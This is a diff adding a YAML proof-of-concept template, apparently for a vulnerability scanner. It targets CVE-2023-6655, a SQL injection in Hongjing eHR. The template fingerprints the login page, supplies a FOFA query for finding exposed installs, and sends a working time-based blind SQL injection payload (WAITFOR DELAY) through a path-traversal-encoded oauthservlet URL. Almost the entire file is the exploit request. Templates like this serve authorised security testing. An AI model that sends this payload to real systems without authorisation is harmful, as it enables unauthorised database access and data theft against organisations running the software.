@@ -1,0 +1,19 @@
+id: poc-yaml-hong-jing-ehr-oauthservlet-sqli
+info:
+  name: 宏景eHR oauthservlet sql注入漏洞(CVE-2023-6655)
+  severity: high
+  tags:
+  - CVE-2023-6655
+  - 两高一弱
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  t1: random_int(5,10)
+requests:
+- method: GET
+  path: /templates/index/hcmlogon.jsp
+  expression: status_code == 200 && contains(body,"/images/hcm/themes/default/login/logo.png")
+- method: GET
+  path: /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--
+  expression: status_code == 200 && duration > t1
+transport: http
